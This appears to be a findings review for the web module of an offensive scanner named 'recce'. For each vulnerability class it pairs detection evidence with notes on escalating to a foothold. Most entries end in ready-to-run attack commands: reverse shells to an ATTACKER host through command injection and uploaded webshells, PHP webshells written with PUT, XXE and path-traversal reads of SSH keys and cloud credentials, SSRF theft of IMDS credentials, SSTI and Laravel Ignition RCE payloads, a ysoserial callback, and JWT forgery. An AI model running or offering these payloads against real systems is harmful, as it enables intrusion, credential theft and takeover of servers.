summary: The web/ package is the deepest module in recce: crawl → inject (SQLi/CMDi/SSRF/LFI/SSTI/reflected-XSS/open-redirect/BOLA/CSRF), JWT alg:none forge + HS crack + RS256→HS256 confusion, PHP/Java/ViewState deserial marker detection, upload+webshell proof, cache-poison, smuggle, XXE, NoSQL auth bypass, actuator/heapdump, .git reconstruction with credential mining, source-map recovery, framework-default-cred POSTs (Grafana/MinIO/Basic). Already reaches T3 in a few places (form/basic default creds accepted, JWT HS-secret cracked → forge, .git dump → creds). Biggest gap: no chaining from a T3 credential capture into an authenticated re-scan, and the JWT alg-confusion 'forged token minted' path stops at T2 without automatically replaying against a token-gated path.

findings.title_pattern: Exposed .git reconstructed - source tree + secrets recovered
findings.tier_evidence: Reconstructs actual git objects, extracts blobs, mines files for _URL_CRED_RE/_ENV_PASS_RE and pushes Credential objects to the store — extracted material, not fingerprint.
findings.promotion_notes: Auto-spray captured creds against SSH/RDP/DB/web-basic same-subnet; already partially wired via credential store. Push the source tree through offline secret-scanner (trufflehog rules) for wider hits.
findings.tester_next_step: git-dumper http://IP:PORT/.git /tmp/gd && cd /tmp/gd && trufflehog filesystem . --json | jq '.Raw' ; for pair in $(grep -Eho '[a-z_]+:[^@/]+@' -r .); do echo $pair; done

findings.title_pattern: JWT HMAC secret cracked / alg:none accepted / RS→HS confusion
findings.tier_evidence: For HS-cracked, the offline HMAC check IS the secret (no FP); for alg:none 'confirmed' the forged token was replayed and matched the authenticated response — proven forgery.
findings.promotion_notes: Auto-forge an admin-claims token and replay against every discovered admin/API path from the crawl to prove privilege escalation → T3 session hijack.
findings.tester_next_step: jwt_tool <token> -C -d rockyou.txt ; jwt_tool <token> -X a -pc admin -pv true ; curl -H 'Authorization: Bearer <forged>' http://IP:PORT/api/admin/users

findings.tier_evidence: Content-type octet-stream / HPROF magic validated — actual heap bytes.
findings.promotion_notes: Auto-strings the hprof, extract JDBC URLs / Bearer tokens / passwords with the loot regex set and fold into credential store; then reuse those against DB modules.
findings.tester_next_step: curl -sSk -o heap.hprof http://IP:PORT/actuator/heapdump && strings heap.hprof | grep -Ei 'jdbc:mysql://|password=|Bearer [A-Za-z0-9._-]{30,}' | sort -u | head -60

findings.tier_evidence: $ne/$gt operator submitted and redirect/session-cookie divergence from wrong-cred baseline — actual login bypass proven.
findings.promotion_notes: Capture the session cookie from the bypass response and hand it back to scan_endpoint auth={Cookie:...} for an authenticated re-scan — the bypass becomes a foothold.
findings.tester_next_step: curl -sSk -c cook.txt -X POST -d 'user[$ne]=x&pass[$ne]=x' http://IP:PORT/login ; curl -sSk -b cook.txt http://IP:PORT/dashboard

findings.title_pattern: XML External Entity (XXE) file read via <path>
findings.tier_evidence: _XXE_HIT confirms /etc/passwd or win.ini content actually returned — proven file read via server-side parser.
findings.promotion_notes: Follow up with /root/.ssh/id_rsa, /home/*/.ssh/id_rsa, /var/www/*/.env, /proc/self/environ reads — captured SSH key → SSH pivot is T3.
findings.tester_next_step: for f in /root/.ssh/id_rsa /home/ubuntu/.ssh/id_rsa /root/.aws/credentials /var/www/html/.env /proc/self/environ; do curl -sSk -X POST -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file://'$f'">]><r>&x;</r>' http://IP:PORT/api ; done

findings.title_pattern: Unrestricted file upload to <engine> code execution
findings.tier_evidence: Uploads server-computed marker (tag+7*7=49) and confirms marker in GET response — actual execution proven.
findings.promotion_notes: Once RCE marker seen, drop a real reverse shell (bash tcp connect / socat) — that is the T3 foothold; already gated on --upload-shell so cleanup is user-managed.
findings.tester_next_step: curl -sSk -F 'file=@shell.php' http://IP:PORT/upload.php ; curl -sSk 'http://IP:PORT/uploads/shell.php?cmd=bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"' # nc -lvnp 4444 on ATTACKER first

findings.tier_evidence: cmdi<computed> marker only appears when shell arithmetic $((a*b)) evaluates — plain reflection cannot false-positive.
findings.promotion_notes: Follow the proven marker with `id;uname -a;cat /etc/shadow` (privileges permitting) and drop an SSH pubkey / reverse shell — T3 foothold.
findings.tester_next_step: curl -sSk 'http://IP:PORT/api/ping?host=1.1.1.1;id' ; curl -sSk 'http://IP:PORT/api/ping?host=1.1.1.1;bash -c "bash -i >%26 /dev/tcp/ATTACKER/4444 0>%261"'

findings.tier_evidence: Cloud-metadata AccessKeyId / GCP JWT / Azure vmId markers confirmed in response body with baseline check ruling out echo — actual server-side fetch proven.
findings.promotion_notes: IMDS -> IAM role -> AWS session; capture the temporary credentials, run aws sts get-caller-identity + list-buckets → T3 cloud foothold.
findings.tester_next_step: curl -sSk 'http://IP:PORT/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' ; ROLE=$(curl above) ; curl -sSk 'http://IP:PORT/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'$ROLE ; export AWS_ACCESS_KEY_ID=... ; aws s3 ls

findings.title_pattern: Path traversal / local file read via <where>
findings.tier_evidence: _TRAVERSAL_HIT confirms actual /etc/passwd or win.ini content returned.
findings.promotion_notes: Read SSH private keys / /proc/self/environ / /var/www/*/.env; register captured creds/keys and pivot via SSH.
findings.tester_next_step: curl -sSk 'http://IP:PORT/download?file=../../../../root/.ssh/id_rsa' | tee id_rsa && chmod 600 id_rsa && ssh -i id_rsa root@IP

findings.tier_evidence: Marker 49 from 7*7 or 7777777 from 7*'7' proves template evaluation; engine identification narrows RCE payload.
findings.promotion_notes: Fire the engine's canonical RCE payload from _SSTI_ENGINES and capture command output; drop a reverse shell → T3.
findings.tester_next_step: curl -sSk 'http://IP:PORT/?msg={{cycler.__init__.__globals__.os.popen("id").read()}}' # Jinja2 ; adjust per identified engine

findings.tier_evidence: Error signature match / boolean divergence / time delta scaling with sleep arg — deterministic, but no data-extraction step is native.
findings.promotion_notes: Hand the confirmed injection point to sqli.py.run_sqlmap (already implemented, gated) for schema/dump — T2 proof of read; a captured admin hash → crack → T3.
findings.tester_next_step: sqlmap -u 'http://IP:PORT/product?id=1' --batch --risk=3 --level=5 --dbs ; sqlmap -u '...' -D app -T users --dump ; hashcat -m 1400 hashes /usr/share/wordlists/rockyou.txt

findings.title_pattern: Arbitrary file write via HTTP PUT (proven)
findings.tier_evidence: _prove_put PUTs a canary, GETs it back, DELETEs it — roundtrip proves write capability.
findings.promotion_notes: If PUT is proven AND server maps script extensions, PUT a webshell (piggyback on _SHELLS from webdav.py) and get RCE → T3.
findings.tester_next_step: curl -sSk -X PUT --data '<?php system($_GET[c]); ?>' http://IP:PORT/shell.php ; curl -sSk 'http://IP:PORT/shell.php?c=id'

findings.title_pattern: Default HTTP Basic / Grafana / MinIO credentials accepted
findings.tier_evidence: _basic_auth_defaults confirms a real HTTP 200 (not just a redirect); _APP_LOGINS require a real session/token artifact — actual foothold established.
findings.promotion_notes: With Grafana admin: read data-source connection strings (DB creds), issue new admin API tokens; with MinIO admin: list all buckets and download SSE-C data. Feed captured DB creds back to db/* modules.
findings.tester_next_step: curl -sSk -u admin:admin http://IP:PORT/api/datasources ; # extract dbUri from response, then: recce scan --mysql <dbuser>:<dbpass>@<dbhost>

findings.title_pattern: Jenkins Script Console reachable unauthenticated (Groovy RCE)
findings.tier_evidence: Signature match on 'Script Console' / 'Jenkins.instance' — a POST of Groovy from an unauth /script IS RCE.
findings.promotion_notes: Submit a Groovy `Runtime.getRuntime().exec(...)` payload to /scriptText — output-based RCE is T3.
findings.tester_next_step: curl -sSk --data-urlencode "script=println 'id'.execute().text" http://IP:PORT/scriptText # then bash reverse shell payload

findings.tier_evidence: Regex confirms root:...:0:0: in body — actual /etc/passwd read via known CVE.
findings.promotion_notes: Read /etc/grafana/grafana.ini (admin_password), then log in with those creds — T3 foothold via credentialed panel.
findings.tester_next_step: curl -sSk 'http://IP:PORT/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini' | grep -Ei 'admin_password|secret_key' ; login → follow web-default-creds datasource extraction

findings.tier_evidence: Detects presence of Ignition; exploitation (log-poison) not attempted.
findings.promotion_notes: Fire the actual CVE-2021-3129 exploit-solution POST body (make-viewable-file / log poisoning) — captured command output = T3 RCE.
findings.tester_next_step: python3 -c "import requests; r=requests.post('http://IP:PORT/_ignition/execute-solution', json={'solution':'Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution','parameters':{'variableName':'a','viewFile':'phar:///var/www/storage/logs/laravel.log'}})"

findings.title_pattern: Web cache poisoning via unkeyed header
findings.tier_evidence: Requires BOTH reflection AND a positive cache signal (X-Cache/Age/max-age) — deterministic when both fire.
findings.promotion_notes: Add a second identical GET without the poisoning header within cache TTL; if the response still contains the canary, the poison IS live (T2 proof).
findings.tester_next_step: curl -sSk -H 'X-Forwarded-Host: attacker.tld' http://IP:PORT/ ; sleep 2 ; curl -sSk http://IP:PORT/ | grep -c attacker.tld  # >0 → confirmed poison

findings.tier_evidence: 3xx Location contains attacker canary — deterministic.
findings.promotion_notes: Client-side/OAuth-code-theft primitive; no server foothold.
findings.tester_next_step: curl -sSk -D- 'http://IP:PORT/oauth/authorize?redirect_uri=https://attacker.tld/cb&client_id=X' | grep -i location

findings.title_pattern: BOLA / IDOR: incrementing an id parameter returns different content
findings.tier_evidence: Diff two shifted ids against baseline with a 0.30-0.98 similarity window — deterministic same-template-different-data.
findings.promotion_notes: Enumerate a numeric-range sweep (1..500) and hash bodies; count of distinct 200-OK bodies = data-extraction proof (T2).
findings.tester_next_step: for i in $(seq 1 500); do curl -sSk -o /tmp/i$i http://IP:PORT/api/user?id=$i; done ; md5sum /tmp/i* | awk '{print $1}' | sort -u | wc -l

findings.title_pattern: CORS reflects arbitrary Origin / null Origin with credentials
findings.tier_evidence: Reflection + Allow-Credentials:true deterministic.
findings.promotion_notes: Client-side XS-read; no server foothold.
findings.tester_next_step: curl -sSk -H 'Origin: https://attacker.example' -D- http://IP:PORT/api/me | grep -i access-control

findings.tier_evidence: Two-shot timing stall vs baseline is a strong signal but only proves parser divergence, not weaponised smuggling.
findings.promotion_notes: With user consent, send a real smuggled prefix-request that fetches /admin unauthenticated on the pooled connection — behind-load-balancer proof is T2.
findings.tester_next_step: smuggler -u http://IP:PORT/ -t 6 ; or hand-craft in Burp Repeater: POST with both CL and TE and observe the second victim's response

findings.tier_evidence: Regex extraction of secret string in JS body — actual credential material captured (though redacted for output).
findings.promotion_notes: Register captured token as Credential(kind=api-token) and probe the vendor API (AWS STS, GitHub /user, Stripe /balance) for validity → T3 identity confirmation.
findings.tester_next_step: TOKEN=$(...) ; curl -sSk -H "Authorization: Bearer $TOKEN" https://api.stripe.com/v1/balance ; aws sts get-caller-identity

findings.title_pattern: Exposed JavaScript source map - original source recovered
findings.tier_evidence: sourcesContent parsed, files reconstructed, gitdump._mine extracts credentials into store.
findings.promotion_notes: Same pathway as web-git-dump — auto-spray captured API keys and DB URIs against known services.
findings.tester_next_step: curl -sSk http://IP:PORT/static/js/main.abc123.js.map | jq -r '.sourcesContent[]' | grep -Ei 'api[_ ]?key|secret|password'

findings.title_pattern: Java/PHP serialized object / ViewState in client-controllable data
findings.tier_evidence: Detects marker (rO0AB, O:N:, ViewState FF01) only — proves the sink exists, not that a gadget lands.
findings.promotion_notes: Send a ysoserial/PHPGGC probe payload with a DNS/HTTP callback to confirm deserialization execution → T2 (or T3 with a real command).
findings.tester_next_step: ysoserial CommonsCollections5 'curl http://ATTACKER/hit' | base64 -w0 ; curl -sSk --cookie 'JSESSIONID=<payload>' http://IP:PORT/  # watch ATTACKER server for callback

findings.tier_evidence: Wordlist hits filtered against baseline-404 shape — deterministic exposure.
findings.promotion_notes: For high-value exposures (config.php, .env.bak, dump.sql) auto-download + mine → T2.
findings.tester_next_step: curl -sSk http://IP:PORT/dump.sql | head -200 ; grep -Ei 'CREATE TABLE users|INSERT INTO' /tmp/dump.sql

findings.tier_evidence: Fingerprint match on the platform's 'unclaimed' error page.

findings.tester_next_step: case $SVC in AWS S3) aws s3api create-bucket --bucket VICTIM ; GitHub Pages) create repo VICTIM/VICTIM.github.io ; Heroku) heroku create VICTIM ;; esac
